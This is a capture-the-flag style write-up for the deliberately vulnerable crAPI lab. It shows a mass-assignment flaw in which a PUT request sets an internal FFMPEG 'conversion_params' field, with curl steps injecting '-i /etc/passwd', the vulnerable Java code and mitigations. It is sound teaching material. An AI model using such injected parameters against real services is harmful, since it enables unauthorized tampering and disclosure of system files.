# Challenge 10 — Mass Assignment: Update internal video properties

**OWASP API Top 10 mapping:** API8:2023 Security Misconfiguration / API3:2023 Excessive Data Exposure  
**crAPI category:** Mass Assignment

## Goal

Modify an internal video-processing property that should be controlled by the server, not by the user.

## Vulnerability

The profile video update endpoint (`PUT /identity/api/v2/user/videos/{video_id}`) accepts a `VideoForm` object and writes any provided field to the `ProfileVideo` entity, including `conversion_params`. This field is used later when the server runs an FFMPEG-style conversion command. Allowing the client to set it is a mass-assignment issue and a stepping stone to command injection.

## Exploit steps

### 1. Authenticate and find your video ID

The dashboard endpoint returns the current user's `video_id`:

```bash
JWT="<your-jwt>"

curl -s -H "Authorization: Bearer $JWT" \
  http://127.0.0.1:8888/identity/api/v2/user/dashboard | python3 -m json.tool
```

Example response:

```json
{
  "id": 4,
  "video_id": 4,
  "video_name": "Test_video",
  ...
}
```

### 2. Update the internal `conversion_params` value

```bash
curl -s -X PUT \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  http://127.0.0.1:8888/identity/api/v2/user/videos/4 \
  -d '{"videoName": "evil.mp4", "conversion_params": "-i /etc/passwd"}' | python3 -m json.tool
```

### 3. Observe the result

```json
{
  "id": 4,
  "video_name": "evil.mp4",
  "conversion_params": "-i /etc/passwd",
  "profileVideo": "data:image/jpeg;base64,..."
}
```

The server accepted and persisted a client-supplied FFMPEG argument string.

## Why this works

- `ProfileServiceImpl.updateProfileVideo` takes a `VideoForm` from the request body.
- It updates `conversion_params` if the field is present:
  ```java
  profileVideo.setConversion_params(
      (videoForm.getConversion_params() != null
          ? videoForm.getConversion_params()
          : profileVideo.getConversion_params()));
  ```
- There is no allow-list of fields the client is permitted to modify, so any field in the form is writable.
- The field is later consumed by the video conversion logic, making it a powerful primitive for follow-up command-injection attacks.

## Impact

- Users can alter server-side processing behavior for their videos.
- In conjunction with a conversion endpoint that shells out, an attacker may achieve command execution or file disclosure.
- Internal implementation details become user-controllable, breaking the trust boundary between client and server.

## Mitigation

- Use a **DTO** for update requests and include only user-editable fields such as `videoName`.
- Reject or ignore any request field that maps to an internal or dangerous property.
- Keep command templates, paths, and encoding settings server-side and immutable; never pass raw user input to shell commands.
- Validate and sanitize every user-supplied value before it reaches any execution context.

## Related challenges

- Challenge 5 shows how the same `conversion_params` field is **leaked** by the GET endpoint.
- Later challenges (shell injection / SSRF) can chain these two findings together.
